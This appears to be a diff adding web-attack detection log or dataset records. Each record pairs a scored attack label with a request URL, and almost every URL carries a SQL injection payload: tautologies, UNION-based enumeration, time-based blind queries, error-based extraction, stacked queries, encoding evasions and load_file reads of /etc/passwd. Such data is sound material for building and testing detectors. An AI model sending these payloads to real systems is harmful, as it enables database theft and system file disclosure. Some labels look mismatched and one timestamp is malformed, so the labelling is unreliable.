+{"time": "2025-11-28T12:10:25Z", "ip": "10.3.0.25", "attack": "Broken Authentication", "score": 86.01, "url": "/dump?id=3;%20SHOW%20TABLES", "body": ""}
+{"time": "2025-11-28T12:10:26Z", "ip": "10.3.0.26", "attack": "SQL Injection", "score": 95.17, "url": "/test?id=2'%20AND%20sleep(1)--", "body": ""}
+{"time": "2025-11-28T12:10:27Z", "ip": "10.3.0.27", "attack": "SQL Injection", "score": 95.3, "url": "/test?id=2'%20AND%20pg_sleep(2)--", "body": ""}
+{"time": "2025-11-28T12:10:28Z", "ip": "10.3.0.28", "attack": "SQL Injection", "score": 98.65, "url": "/compare?id=1'%20AND%20ASCII(SUBSTR('abc',1,1))>50", "body": ""}
+{"time": "2025-11-28T12:10:29Z", "ip": "10.3.0.29", "attack": "SQL Injection", "score": 94.7, "url": "/compare?id=1'%20AND%20LENGTH('abcd')=4", "body": ""}
+{"time": "2025-11-28T12:10:30Z", "ip": "10.3.0.30", "attack": "SQL Injection", "score": 92.96, "url": "/cast?id=1'%20OR%20CAST('1'%20AS%20SIGNED)=1--", "body": ""}
+{"time": "2025-11-28T12:10:31Z", "ip": "10.3.0.31", "attack": "SQL Injection", "score": 92.59, "url": "/rand?id=1'%20OR%20RAND()%3c0.8", "body": ""}
+{"time": "2025-11-28T12:10:32Z", "ip": "10.3.0.32", "attack": "SQL Injection", "score": 99.23, "url": "/complex?id=1'%20AND%20MD5(1)='c4ca4238a0b923820dcc509a6f75849b'", "body": ""}
+{"time": "2025-11-28T12:10:33Z", "ip": "10.3.0.33", "attack": "SQL Injection", "score": 98.88, "url": "/complex?id=1'%20AND%20SHA1('a')='86f7e437faa5a7fce15d1ddcb9eaeaea377667b8'", "body": ""}
+{"time": "2025-11-28T12:10:34Z", "ip": "10.3.0.34", "attack": "SQL Injection", "score": 54.67, "url": "/like2?id=1'%20OR%20'abc'%20LIKE%20'abc'", "body": ""}
+{"time": "2025-11-28T12:10:35Z", "ip": "10.3.0.35", "attack": "Broken Authentication", "score": 52.19, "url": "/like2?id=1'%20OR%20'abc'%20LIKE%20'%25a%25'", "body": ""}
+{"time": "2025-11-28T12:10:36Z", "ip": "10.3.0.36", "attack": "Broken Authentication", "score": 55.75, "url": "/in?id=1'%20OR%201%20IN(1,2,3)", "body": ""}
+{"time": "2025-11-28T12:10:37Z", "ip": "10.3.0.37", "attack": "SQL Injection", "score": 75.83, "url": "/in?id=1'%20OR%201%20IN(SELECT%201)", "body": ""}
+{"time": "2025-11-28T12:10:38Z", "ip": "10.3.0.38", "attack": "SQL Injection", "score": 72.85, "url": "/mlog?id=%27%20OR%201=1--", "body": ""}
+{"time": "2025-11-28T12:10:39Z", "ip": "10.3.0.39", "attack": "SQL Injection", "score": 72.85, "url": "/mlog?id=%2527%2520OR%25201=1--", "body": ""}
+{"time": "2025-11-28T12:10:40Z", "ip": "10.3.0.40", "attack": "SQL Injection", "score": 71.04, "url": "/mlog?id=%25%32%37%20OR%20%25%32%37%3d%25%32%37", "body": ""}
+{"time": "2025-11-28T12:10:41Z", "ip": "10.3.0.41", "attack": "Broken Authentication", "score": 92.57, "url": "/path?id=..%2f..%2f%27OR%271%3d1", "body": ""}
+{"time": "2025-11-28T12:10:42Z", "ip": "10.3.0.42", "attack": "Broken Authentication", "score": 88.99, "url": "/stack?id=1;%20SELECT%201", "body": ""}
+{"time": "2025-11-28T12:10:43Z", "ip": "10.3.0.43", "attack": "Broken Authentication", "score": 88.07, "url": "/stack?id=1;%20SHOW%20VARIABLES", "body": ""}
+{"time": "2025-11-28T12:10:44Z", "ip": "10.3.0.44", "attack": "Broken Authentication", "score": 60.24, "url": "/stack?id=1;%20SELECT%20@@datadir", "body": ""}
+{"time": "2025-11-28T12:10:45Z", "ip": "10.3.0.45", "attack": "SQL Injection", "score": 99.89, "url": "/dual?id=5'%20OR%20EXISTS(SELECT%201%20FROM%20dual)--", "body": ""}
+{"time": "2025-11-28T12:10:46Z", "ip": "10.3.0.46", "attack": "SQL Injection", "score": 99.62, "url": "/dual?id=5'%20OR%20NOT%20EXISTS(SELECT%201)--", "body": ""}
+{"time": "2025-11-28T12:10:47Z", "ip": "10.3.0.47", "attack": "Broken Authentication", "score": 51.2, "url": "/rand2?id=1'%20OR%20RAND()%3e0.1", "body": ""}
+{"time": "2025-11-28T12:10:48Z", "ip": "10.3.0.48", "attack": "SQL Injection", "score": 75.53, "url": "/concat?id=1'%20OR%20CONCAT('x','y')='xy'", "body": ""}
+{"time": "2025-11-28T12:10:49Z", "ip": "10.3.0.49", "attack": "SQL Injection", "score": 71.56, "url": "/deep?id=1'%20OR%20HEX(user())%3e''", "body": ""}
+{"time": "2025-11-28T12:10:50Z", "ip": "10.3.0.50", "attack": "SQL Injection", "score": 93.94, "url": "/validate?id=1'%20OR%20JSON_VALID('[1,2]')=1--", "body": ""}
+{"time": "2025-11-28T12:20:01Z", "ip": "10.4.0.1", "attack": "Broken Authentication", "score": 67.14, "url": "/login?u=admin'%20OR%20'1'='1'--", "body": ""}
+{"time": "2025-11-28T12:20:02Z", "ip": "10.4.0.2", "attack": "Broken Authentication", "score": 98.22, "url": "/login?u=test%27OR%271%27=%271", "body": ""}
+{"time": "2025-11-28T12:20:03Z", "ip": "10.4.0.3", "attack": "SQL Injection", "score": 95.5, "url": "/auth?id=1'%20OR%20sleep(3)--", "body": ""}
+{"time": "2025-11-28T12:20:04Z", "ip": "10.4.0.4", "attack": "SQL Injection", "score": 97.45, "url": "/auth?id=1'%20AND%20sleep(2)--", "body": ""}
+{"time": "2025-11-28T12:20:05Z", "ip": "10.4.0.5", "attack": "SQL Injection", "score": 95.03, "url": "/profile?id=%27%20OR%20%271%27=%271%27--", "body": ""}
+{"time": "2025-11-28T12:20:06Z", "ip": "10.4.0.6", "attack": "Broken Authentication", "score": 88.75, "url": "/profile?id=0%20OR%200=0", "body": ""}
+{"time": "2025-11-28T12:20:07Z", "ip": "10.4.0.7", "attack": "Broken Authentication", "score": 67.95, "url": "/view?id=5)%20OR%20(1=1", "body": ""}
+{"time": "2025-11-28T12:20:08Z", "ip": "10.4.0.8", "attack": "SQL Injection", "score": 62.86, "url": "/view?id=5')%20OR%20('a'='a", "body": ""}
+{"time": "2025-11-28T12:20:09Z", "ip": "10.4.0.9", "attack": "Broken Authentication", "score": 89.54, "url": "/data?id=10%20AND%20TRUE", "body": ""}
+{"time": "2025-11-28T12:20:10Z", "ip": "10.4.0.10", "attack": "Broken Authentication", "score": 90.08, "url": "/data?id=10%20AND%20FALSE", "body": ""}
+{"time": "2025-11-28T12:20:11Z", "ip": "10.4.0.11", "attack": "Broken Authentication", "score": 50.25, "url": "/dump?id=1%20OR%201%20IN(1,2,3)", "body": ""}
+{"time": "2025-11-28T12:20:12Z", "ip": "10.4.0.12", "attack": "SQL Injection", "score": 91.21, "url": "/dump?id=1%20OR%201%20IN(SELECT%201)", "body": ""}
+{"time": "2025-11-28T12:20:13Z", "ip": "10.4.0.13", "attack": "SQL Injection", "score": 91.12, "url": "/dump?id=%27%20OR%201=1--", "body": ""}
+{"time": "2025-11-28T12:20:14Z", "ip": "10.4.0.14", "attack": "SQL Injection", "score": 79.94, "url": "/search?q='%20OR%20'1'='1'", "body": ""}
+{"time": "2025-11-28T12:20:15Z", "ip": "10.4.0.15", "attack": "SQL Injection", "score": 97.46, "url": "/search?q=test'%20OR%20JSON_TYPE('{\"x\":9}','$.x')='NUMBER'--", "body": ""}
+{"time": "2025-11-28T12:20:16Z", "ip": "10.4.0.16", "attack": "SQL Injection", "score": 99.41, "url": "/info?id=3'%20UNION%20SELECT%201,2", "body": ""}
+{"time": "2025-11-28T12:20:17Z", "ip": "10.4.0.17", "attack": "SQL Injection", "score": 99.77, "url": "/info?id=3'%20UNION%20SELECT%201,2,3", "body": ""}
+{"time": "2025-11-28T12:20:18Z", "ip": "10.4.0.18", "attack": "SQL Injection", "score": 99.94, "url": "/info?id=3'%20UNION%20SELECT%20user(),database()", "body": ""}
+{"time": "2025-11-28T12:20:19Z", "ip": "10.4.0.19", "attack": "SQL Injection", "score": 99.79, "url": "/info?id=3'%20UNION%20SELECT%20@@hostname,NULL", "body": ""}
+{"time": "2025-11-28T12:20:20Z", "ip": "10.4.0.20", "attack": "SQL Injection", "score": 93.24, "url": "/details?id=1'%20OR%20EXTRACTVALUE(1,concat(0x21,user()))", "body": ""}
+{"time": "2025-11-28T12:20:21Z", "ip": "10.4.0.21", "attack": "SQL Injection", "score": 96.1, "url": "/details?id=1'%20OR%20updatexml(1,concat(0x21,database()),1)", "body": ""}
+{"time": "2025-11-28T12:20:22Z", "ip": "10.4.0.22", "attack": "SQL Injection", "score": 97.49, "url": "/compare?id=4'%20AND%20sleep(1)--", "body": ""}
+{"time": "2025-11-28T12:20:23Z", "ip": "10.4.0.23", "attack": "SQL Injection", "score": 97.95, "url": "/compare?id=4'%20AND%20pg_sleep(3)--", "body": ""}
+{"time": "2025-11-28T12:20:24Z", "ip": "10.4.0.24", "attack": "SQL Injection", "score": 95.91, "url": "/check?id=1'%20AND%20LENGTH('abc')=3", "body": ""}
+{"time": "2025-11-28T12:20:25Z", "ip": "10.4.0.25", "attack": "SQL Injection", "score": 99.1, "url": "/check?id=1'%20AND%20ASCII(SUBSTR('x',1,1))>70", "body": ""}
+{"time": "2025-11-28T12:20:26Z", "ip": "10.4.0.26", "attack": "SQL Injection", "score": 82.19, "url": "/cat?id=1'%20OR%20cast('1'%20AS%20signed)=1--", "body": ""}
+{"time": "2025-11-28T12:20:27Z", "ip": "10.4.0.27", "attack": "SQL Injection", "score": 92.75, "url": "/cast?id=8'%20OR%20CAST(0x31%20AS%20UNSIGNED)=1", "body": ""}
+{"time": "2025-11-28T12:20:28Z", "ip": "10.4.0.28", "attack": "SQL Injection", "score": 99.24, "url": "/api?x=%27%20OR%20RAND()%3c0.9", "body": ""}
+{"time": "2025-11-28T12:20:29Z", "ip": "10.4.0.29", "attack": "SQL Injection", "score": 94.33, "url": "/api?x=%27%20OR%20RAND()%3e0.1", "body": ""}
+{"time": "2025-11-28T12:20:30Z", "ip": "10.4.0.30", "attack": "Broken Authentication", "score": 86.59, "url": "/xor?id=4'%20XOR%201=1", "body": ""}
+{"time": "2025-11-28T12:20:31Z", "ip": "10.4.0.31", "attack": "SQL Injection", "score": 68.15, "url": "/xor?id='X'%20XOR%20'X'='X'", "body": ""}
+{"time": "2025-11-28T12:20:32Z", "ip": "10.4.0.32", "attack": "Broken Authentication", "score": 49.95, "url": "/join?id=2'%20OR%20'1'%20LIKE%20'1'", "body": ""}
+{"time": "2025-11-28T12:20:33Z", "ip": "10.4.0.33", "attack": "Broken Authentication", "score": 60.23, "url": "/join?id=2'%20OR%20'%25a%25'%20LIKE%20'%25a%25'", "body": ""}
+{"time": "2025-11-28T12:20:34Z", "ip": "10.4.0.34", "attack": "SQL Injection", "score": 89.04, "url": "/math?id=1'%20OR%20(5*5)=25", "body": ""}
+{"time": "2025-11-28T12:20:35Z", "ip": "10.4.0.35", "attack": "SQL Injection", "score": 86.63, "url": "/math?id=1'%20OR%20(10/2)=5", "body": ""}
+{"time": "2025-11-28T12:20:36Z", "ip": "10.4.0.36", "attack": "SQL Injection", "score": 99.95, "url": "/count?id=4'%20OR%20(SELECT%20COUNT(*)%20FROM%20users)>0", "body": ""}
+{"time": "2025-11-28T12:20:37Z", "ip": "10.4.0.37", "attack": "SQL Injection", "score": 99.96, "url": "/count?id=4'%20AND%20(SELECT%20COUNT(*)%20FROM%20admin)=1", "body": ""}
+{"time": "2025-11-28T12:20:38Z", "ip": "10.4.0.38", "attack": "SQL Injection", "score": 99.35, "url": "/json?id=1'%20OR%20json_extract('{\"a\":9}','$.a')=9", "body": ""}
+{"time": "2025-11-28T12:20:39Z", "ip": "10.4.0.39", "attack": "SQL Injection", "score": 93.27, "url": "/json?id=1'%20OR%20JSON_VALID('[1,2]')=1", "body": ""}
+{"time": "2025-11-28T12:20:40Z", "ip": "10.4.0.40", "attack": "Broken Authentication", "score": 72.9, "url": "/unicode?id=%u0027%20OR%20%u0031=%u0031", "body": ""}
+{"time": "2025-11-28T12:20:41Z", "ip": "10.4.0.41", "attack": "Broken Authentication", "score": 79.51, "url": "/unicode?id=\\u0027%20OR%201=1", "body": ""}
+{"time": "2025-11-28T12:20:42Z", "ip": "10.4.0.42", "attack": "Broken Authentication", "score": 85.7, "url": "/hex?id=0x31%20OR%200x31=0x31", "body": ""}
+{"time": "2025-11-28T12:20:43Z", "ip": "10.4.0.43", "attack": "Broken Authentication", "score": 83.08, "url": "/hex?id=0x41%20AND%200x41>0", "body": ""}
+{"time": "2025-11-28T12:20:44Z", "ip": "10.4.0.44", "attack": "SQL Injection", "score": 48.61, "url": "/case?id=1'%20OR%20CASE%20WHEN%201=1%20THEN%201%20ELSE%200%20END=1", "body": ""}
+{"time": "2025-11-28T12:20:45Z", "ip": "10.4.0.45", "attack": "SQL Injection", "score": 49.13, "url": "/case?id=1'%20OR%20CASE%20WHEN%201=2%20THEN%201%20ELSE%200%20END=0", "body": ""}
+{"time": "2025-11-28T12:20:46Z", "ip": "10.4.0.46", "attack": "SQL Injection", "score": 50.17, "url": "/like?id=1'%20OR%20'a'%20LIKE%20'%25a%25'", "body": ""}
+{"time": "2025-11-28T12:20:47Z", "ip": "10.4.0.47", "attack": "SQL Injection", "score": 54.67, "url": "/like?id=1'%20OR%20'abc'%20LIKE%20'abc'", "body": ""}
+{"time": "2022025-11-28T12:20:48Z", "ip": "10.4.0.48", "attack": "Broken Authentication", "score": 88.99, "url": "/stack?id=1;%20SELECT%201", "body": ""}
+{"time": "2025-11-28T12:20:49Z", "ip": "10.4.0.49", "attack": "Broken Authentication", "score": 99.41, "url": "/stack?id=1;%20SHOW%20DATABASES", "body": ""}
+{"time": "2025-11-28T12:20:50Z", "ip": "10.4.0.50", "attack": "Broken Authentication", "score": 92.96, "url": "/stack?id=1;%20SHOW%20TABLES", "body": ""}
+{"time": "2025-11-28T12:20:51Z", "ip": "10.4.0.51", "attack": "SQL Injection", "score": 91.5, "url": "/math2?id=1'%20OR%20(9-4)=5", "body": ""}
+{"time": "2025-11-28T12:20:52Z", "ip": "10.4.0.52", "attack": "SQL Injection", "score": 89.07, "url": "/math2?id=1'%20OR%20(7+3)=10", "body": ""}
+{"time": "2025-11-28T12:20:53Z", "ip": "10.4.0.53", "attack": "Broken Authentication", "score": 95.9, "url": "/adv?id=1''OR''1''=''1", "body": ""}
+{"time": "2025-11-28T12:20:54Z", "ip": "10.4.0.54", "attack": "SQL Injection", "score": 67.63, "url": "/adv?id=admin'%20OR%201=1--", "body": ""}
+{"time": "2025-11-28T12:20:55Z", "ip": "10.4.0.55", "attack": "SQL Injection", "score": 96.15, "url": "/ascii?id=1'%20AND%20ASCII('A')=65", "body": ""}
+{"time": "2025-11-28T12:20:56Z", "ip": "10.4.0.56", "attack": "SQL Injection", "score": 99.8, "url": "/ascii?id=1'%20AND%20ASCII(SUBSTR('Z',1,1))=90", "body": ""}
+{"time": "2025-11-28T12:20:57Z", "ip": "10.4.0.57", "attack": "SQL Injection", "score": 99.96, "url": "/exists?id=2'%20AND%20EXISTS(SELECT%201%20FROM%20users)", "body": ""}
+{"time": "2025-11-28T12:20:58Z", "ip": "10.4.0.58", "attack": "SQL Injection", "score": 99.97, "url": "/exists?id=2'%20AND%20NOT%20EXISTS(SELECT%201%20FROM%20admin)", "body": ""}
+{"time": "2025-11-28T12:20:59Z", "ip": "10.4.0.59", "attack": "SQL Injection", "score": 99.41, "url": "/bin?id=1'%20UNION%20SELECT%20load_file('/etc/passwd')", "body": ""}
+{"time": "2025-11-28T12:21:00Z", "ip": "10.4.0.60", "attack": "SQL Injection", "score": 99.7, "url": "/bin?id=1'%20UNION%20SELECT%20load_file('/etc/hosts')", "body": ""}
+{"time": "2025-11-28T13:10:01Z", "ip": "10.5.0.1", "attack": "SQL Injection", "score": 81.23, "url": "/login?id=1'%20OR%20'foo'='foo'--", "body": ""}
+{"time": "2025-11-28T13:10:02Z", "ip": "10.5.0.2", "attack": "Broken Authentication", "score": 76.41, "url": "/login?id=3'%20OR%203>2--", "body": ""}
+{"time": "2025-11-28T13:10:03Z", "ip": "10.5.0.3", "attack": "Broken Authentication", "score": 90.15, "url": "/login?id='OR%20'1'%3D'1", "body": ""}
+{"time": "2025-11-28T13:10:04Z", "ip": "10.5.0.4", "attack": "SQL Injection", "score": 95.0, "url": "/auth?uid=admin'%20AND%20SLEEP(1)--", "body": ""}
+{"time": "2025-11-28T13:10:05Z", "ip": "10.5.0.5", "attack": "SQL Injection", "score": 93.84, "url": "/auth?uid=admin'%20AND%20SLEEP(3)--", "body": ""}
+{"time": "2025-11-28T13:10:06Z", "ip": "10.5.0.6", "attack": "SQL Injection", "score": 66.3, "url": "/profile?id=5'%20OR%205*5=25--", "body": ""}
+{"time": "2025-11-28T13:10:07Z", "ip": "10.5.0.7", "attack": "SQL Injection", "score": 68.86, "url": "/profile?id=5'%20OR%207-2=5--", "body": ""}
+{"time": "2025-11-28T13:10:08Z", "ip": "10.5.0.8", "attack": "SQL Injection", "score": 99.85, "url": "/item?id=10'%20UNION%20SELECT%201,2--", "body": ""}
+{"time": "2025-11-28T13:10:09Z", "ip": "10.5.0.9", "attack": "SQL Injection", "score": 99.81, "url": "/item?id=10'%20UNION%20SELECT%201,version()--", "body": ""}
+{"time": "2025-11-28T13:10:10Z", "ip": "10.5.0.10", "attack": "SQL Injection", "score": 99.97, "url": "/item?id=10'%20UNION%20SELECT%20database(),user()--", "body": ""}
+{"time": "2025-11-28T13:10:11Z", "ip": "10.5.0.11", "attack": "SQL Injection", "score": 97.76, "url": "/data?id=1'%20OR%20EXISTS(SELECT%201)--", "body": ""}
+{"time": "2025-11-28T13:10:12Z", "ip": "10.5.0.12", "attack": "SQL Injection", "score": 99.68, "url": "/data?id=1'%20OR%20NOT%20EXISTS(SELECT%201)--", "body": ""}
+{"time": "2025-11-28T13:10:13Z", "ip": "10.5.0.13", "attack": "SQL Injection", "score": 99.6, "url": "/search?q='%20OR%20JSON_EXTRACT('{\"x\":9}','$.x')=9--", "body": ""}
+{"time": "2025-11-28T13:10:14Z", "ip": "10.5.0.14", "attack": "SQL Injection", "score": 99.18, "url": "/search?q='%20OR%20JSON_KEYS('{\"a\":1}') IS NOT NULL--", "body": ""}
+{"time": "2025-11-28T13:10:15Z", "ip": "10.5.0.15", "attack": "SQL Injection", "score": 73.87, "url": "/filter?id=1%27%20OR%20%27x%27=%27x", "body": ""}
+{"time": "2025-11-28T13:10:16Z", "ip": "10.5.0.16", "attack": "Broken Authentication", "score": 73.82, "url": "/filter?id=1%27%20OR%20TRUE--", "body": ""}
+{"time": "2025-11-28T13:10:17Z", "ip": "10.5.0.17", "attack": "SQL Injection", "score": 96.49, "url": "/load?id=1'%20AND%20LENGTH('admin')=5", "body": ""}
+{"time": "2025-11-28T13:10:18Z", "ip": "10.5.0.18", "attack": "SQL Injection", "score": 95.18, "url": "/load?id=1'%20AND%20ASCII('A')=65", "body": ""}
+{"time": "2025-11-28T13:10:19Z", "ip": "10.5.0.19", "attack": "SQL Injection", "score": 97.79, "url": "/info?id=1'%20OR%20CHAR(97)=97", "body": ""}
+{"time": "2025-11-28T13:10:20Z", "ip": "10.5.0.20", "attack": "SQL Injection", "score": 98.3, "url": "/info?id=1'%20OR%20CHAR(0x61)=97", "body": ""}
+{"time": "2025-11-28T13:10:21Z", "ip": "10.5.0.21", "attack": "SQL Injection", "score": 99.94, "url": "/union?id=%27%20UNION%20SELECT%20NULL,NULL,NULL--", "body": ""}
+{"time": "2025-11-28T13:10:22Z", "ip": "10.5.0.22", "attack": "SQL Injection", "score": 99.95, "url": "/union?id=0%20UNION%20SELECT%20table_name,NULL%20FROM%20information_schema.tables--", "body": ""}
+{"time": "2025-11-28T13:10:23Z", "ip": "10.5.0.23", "attack": "SQL Injection", "score": 99.59, "url": "/api?val='%20OR%20BENCHMARK(1000000,MD5(1))--", "body": ""}
+{"time": "2025-11-28T13:10:24Z", "ip": "10.5.0.24", "attack": "SQL Injection", "score": 99.24, "url": "/api?val='%20OR%20pg_sleep(1)--", "body": ""}
+{"time": "2025-11-28T13:10:25Z", "ip": "10.5.0.25", "attack": "SQL Injection", "score": 92.81, "url": "/json?id=1'%20OR%20JSON_VALID('[1]')=1", "body": ""}
+{"time": "2025-11-28T13:10:26Z", "ip": "10.5.0.26", "attack": "SQL Injection", "score": 98.89, "url": "/json?id=1'%20OR%20JSON_TYPE('{\"a\":3}','$.a')='NUMBER'", "body": ""}
+{"time": "2025-11-28T13:10:27Z", "ip": "10.5.0.27", "attack": "SQL Injection", "score": 99.96, "url": "/adv?id=1'%20OR%20(SELECT%20COUNT(*)%20FROM%20users)>0", "body": ""}
+{"time": "2025-11-28T13:10:28Z", "ip": "10.5.0.28", "attack": "SQL Injection", "score": 99.97, "url": "/adv?id=1'%20AND%20(SELECT%20COUNT(*)%20FROM%20admin)=1", "body": ""}
+{"time": "2025-11-28T13:10:29Z", "ip": "10.5.0.29", "attack": "Broken Authentication", "score": 62.36, "url": "/case?id=1'%20OR%20CASE%20WHEN%20'1'='1'%20THEN%201%20END", "body": ""}
+{"time": "2025-11-28T13:10:30Z", "ip": "10.5.0.30", "attack": "Broken Authentication", "score": 49.89, "url": "/case?id=1'%20OR%20CASE%20WHEN%202>1%20THEN%205%20END=5", "body": ""}
+{"time": "2025-11-28T13:10:31Z", "ip": "10.5.0.31", "attack": "Broken Authentication", "score": 72.9, "url": "/unicode?id=%u0027%20OR%20%u0031=%u0031", "body": ""}
+{"time": "2025-11-28T13:10:32Z", "ip": "10.5.0.32", "attack": "Broken Authentication", "score": 73.08, "url": "/unicode?id=\\u0027%20OR%20\\u0031=\\u0031", "body": ""}
+{"time": "2025-11-28T13:10:33Z", "ip": "10.5.0.33", "attack": "Broken Authentication", "score": 85.7, "url": "/hex?id=0x31%20OR%200x31=0x31", "body": ""}
+{"time": "2025-11-28T13:10:34Z", "ip": "10.5.0.34", "attack": "Broken Authentication", "score": 83.08, "url": "/hex?id=0x41%20AND%200x41>0", "body": ""}
+{"time": "2025-11-28T13:10:35Z", "ip": "10.5.0.35", "attack": "SQL Injection", "score": 99.38, "url": "/json2?id=9'%20OR%20JSON_EXTRACT('{\"t\":1}','$.t')=1", "body": ""}
+{"time": "2025-11-28T13:10:36Z", "ip": "10.5.0.36", "attack": "SQL Injection", "score": 99.22, "url": "/json2?id=9'%20OR%20JSON_EXTRACT('[10]','$[0]')=10", "body": ""}
+{"time": "2025-11-28T13:10:37Z", "ip": "10.5.0.37", "attack": "SQL Injection", "score": 94.29, "url": "/validate?id=1'%20AND%20JSON_VALID('{\"a\":2}')=1", "body": ""}
+{"time": "2025-11-28T13:10:38Z", "ip": "10.5.0.38", "attack": "SQL Injection", "score": 92.36, "url": "/validate?id=1'%20AND%20JSON_VALID('[123]')=1", "body": ""}
+{"time": "2025-11-28T13:10:39Z", "ip": "10.5.0.39", "attack": "SQL Injection", "score": 95.15, "url": "/regexp?id=2'%20AND%20REGEXP_LIKE('abc','^a')", "body": ""}
+{"time": "2025-11-28T13:10:40Z", "ip": "10.5.0.40", "attack": "SQL Injection", "score": 96.1, "url": "/regexp?id=2'%20AND%20REGEXP_LIKE('zzz','z+')", "body": ""}
+{"time": "2025-11-28T13:10:41Z", "ip": "10.5.0.41", "attack": "SQL Injection", "score": 98.91, "url": "/sub?id=5'%20AND%20SUBSTR('abc',1,1)='a'", "body": ""}
+{"time": "2025-11-28T13:10:42Z", "ip": "10.5.0.42", "attack": "SQL Injection", "score": 98.91, "url": "/sub?id=5'%20AND%20substring('hello',1,1)='h'", "body": ""}
+{"time": "2025-11-28T13:10:43Z", "ip": "10.5.0.43", "attack": "SQL Injection", "score": 95.94, "url": "/bit?id=1'%20OR%20(1|2)=3", "body": ""}
+{"time": "2025-11-28T13:10:44Z", "ip": "10.5.0.44", "attack": "SQL Injection", "score": 94.08, "url": "/bit?id=1'%20OR%20(1&1)=1", "body": ""}
+{"time": "2025-11-28T13:10:45Z", "ip": "10.5.0.45", "attack": "SQL Injection", "score": 99.38, "url": "/jsonmix?id=3'%20OR%20JSON_EXTRACT('{\"a\":1,\"b\":2}','$.b')=2", "body": ""}
+{"time": "2025-11-28T13:10:46Z", "ip": "10.5.0.46", "attack": "SQL Injection", "score": 97.23, "url": "/jsonmix?id=3'%20OR%20JSON_LENGTH('[1,2,3]')=3", "body": ""}
+{"time": "2025-11-28T13:10:47Z", "ip": "10.5.0.47", "attack": "Broken Authentication", "score": 57.14, "url": "/rand?id=1'%20OR%20RAND()>0", "body": ""}
+{"time": "2025-11-28T13:10:48Z", "ip": "10.5.0.48", "attack": "SQL Injection", "score": 92.41, "url": "/rand?id=1'%20OR%20RAND()<1", "body": ""}
+{"time": "2025-11-28T13:10:49Z", "ip": "10.5.0.49", "attack": "SQL Injection", "score": 87.8, "url": "/where?id=1'%20OR%20'admin'='admin'", "body": ""}
+{"time": "2025-11-28T13:10:50Z", "ip": "10.5.0.50", "attack": "Broken Authentication", "score": 80.12, "url": "/where?id=1'%20OR%20'A'>'B'", "body": ""}
+{"time": "2025-11-28T14:00:01Z", "ip": "10.6.0.1", "attack": "SQL Injection", "score": 99.06, "url": "/login?id=1%27%20OR%20(SELECT%20USER())%20LIKE%20%27root%25%27--", "body": ""}
+{"time": "2025-11-28T14:00:02Z", "ip": "10.6.0.2", "attack": "SQL Injection", "score": 99.95, "url": "/login?id=1'%20OR%20((SELECT%20COUNT(*)%20FROM%20users)>0)--", "body": ""}
+{"time": "2025-11-28T14:00:03Z", "ip": "10.6.0.3", "attack": "SQL Injection", "score": 99.96, "url": "/user?id=5'%20AND%20(SELECT%20BENCHMARK(100000,MD5(1)))--", "body": ""}
+{"time": "2025-11-28T14:00:04Z", "ip": "10.6.0.4", "attack": "SQL Injection", "score": 97.89, "url": "/user?id=5'%20AND%20pg_sleep(2)--", "body": ""}
+{"time": "2025-11-28T14:00:05Z", "ip": "10.6.0.5", "attack": "SQL Injection", "score": 99.89, "url": "/api/data?id='%20UNION%20SELECT%201,2,3,4--", "body": ""}
+{"time": "2025-11-28T14:00:06Z", "ip": "10.6.0.6", "attack": "SQL Injection", "score": 99.98, "url": "/api/data?id='%20UNION%20SELECT%20NULL,version(),user(),database()--", "body": ""}
+{"time": "2025-11-28T14:00:07Z", "ip": "10.6.0.7", "attack": "SQL Injection", "score": 99.77, "url": "/search?q='%20OR%20EXTRACTVALUE(1,concat(0x7e,(SELECT%20version())))--", "body": ""}
+{"time": "2025-11-28T14:00:08Z", "ip": "10.6.0.8", "attack": "SQL Injection", "score": 99.96, "url": "/search?q='%20OR%20UPDATEXML(1,concat(0x7e,(SELECT%20database())),1)--", "body": ""}
+{"time": "2025-11-28T14:00:09Z", "ip": "10.6.0.9", "attack": "SQL Injection", "score": 92.65, "url": "/info?id=3%27%20OR%20CAST('1'%20AS%20SIGNED)=1--", "body": ""}
+{"time": "2025-11-28T14:00:10Z", "ip": "10.6.0.10", "attack": "SQL Injection", "score": 77.22, "url": "/info?id=3%27%20OR%200x31=0x31--", "body": ""}
+{"time": "2025-11-28T14:00:11Z", "ip": "10.6.0.11", "attack": "SQL Injection", "score": 98.66, "url": "/adv?id=7'%20AND%20(SELECT%20@@version)>0--", "body": ""}
+{"time": "2025-11-28T14:00:12Z", "ip": "10.6.0.12", "attack": "SQL Injection", "score": 98.54, "url": "/adv?id=7'%20AND%20@@hostname%20IS%20NOT%20NULL--", "body": ""}
+{"time": "2025-11-28T14:00:13Z", "ip": "10.6.0.13", "attack": "SQL Injection", "score": 99.94, "url": "/item?id=4'%20OR%20(SELECT%20COUNT(*)%20FROM%20information_schema.tables)>10--", "body": ""}
+{"time": "2025-11-28T14:00:14Z", "ip": "10.6.0.14", "attack": "SQL Injection", "score": 99.96, "url": "/item?id=4'%20OR%20(SELECT%20schema_name%20FROM%20information_schema.schemata%20LIMIT%201)='mysql'--", "body": ""}
+{"time": "2025-11-28T14:00:15Z", "ip": "10.6.0.15", "attack": "SQL Injection", "score": 70.72, "url": "/check?id='%20OR%20'あ'='あ'--", "body": ""}
+{"time": "2025-11-28T14:00:16Z", "ip": "10.6.0.16", "attack": "SQL Injection", "score": 70.72, "url": "/check?id='%20OR%20'𐍈'='𐍈'--", "body": ""}
+{"time": "2025-11-28T14:00:17Z", "ip": "10.6.0.17", "attack": "SQL Injection", "score": 86.35, "url": "/encoded?id=%2527%2520OR%25201=1--", "body": ""}
+{"time": "2025-11-28T14:00:18Z", "ip": "10.6.0.18", "attack": "SQL Injection", "score": 83.14, "url": "/encoded?id=%255c%255c%2527%20OR%20%27x%27=%27x", "body": ""}
+{"time": "2025-11-28T14:00:19Z", "ip": "10.6.0.19", "attack": "Broken Authentication", "score": 72.53, "url": "/unicode?id=\\u0027%20OR%20\\u0061=\\u0061", "body": ""}
+{"time": "2025-11-28T14:00:20Z", "ip": "10.6.0.20", "attack": "Broken Authentication", "score": 75.07, "url": "/unicode?id=%u0027%20OR%20%u0030%3D%u0030", "body": ""}
+{"time": "2025-11-28T14:00:21Z", "ip": "10.6.0.21", "attack": "SQL Injection", "score": 51.68, "url": "/db?id=1'%20OR%20@@datadir%20LIKE%20'/%25'--", "body": ""}
+{"time": "2025-11-28T14:00:22Z", "ip": "10.6.0.22", "attack": "SQL Injection", "score": 97.27, "url": "/db?id=1'%20OR%20@@version_compile_os%20LIKE%20'%25'%20--", "body": ""}
+{"time": "2025-11-28T14:00:23Z", "ip": "10.6.0.23", "attack": "SQL Injection", "score": 99.84, "url": "/sys?id='%20UNION%20SELECT%20@@hostname,NULL--", "body": ""}
